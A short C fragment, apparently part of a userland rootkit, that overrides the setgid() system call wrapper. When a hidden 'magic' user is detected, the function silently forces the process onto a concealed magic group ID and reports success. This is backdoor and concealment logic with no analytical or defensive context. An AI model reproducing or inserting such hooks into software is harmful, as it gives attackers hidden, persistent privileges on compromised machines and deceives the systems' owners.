int setgid(gid_t gid){
    hook(CSETGID);
    if(magicusr()){
        gid_t magicgid = readgid();
        if(gid != magicgid)
            call(CSETGID, magicgid);
        return 0;
    }
    return (long)call(CSETGID, gid);
}
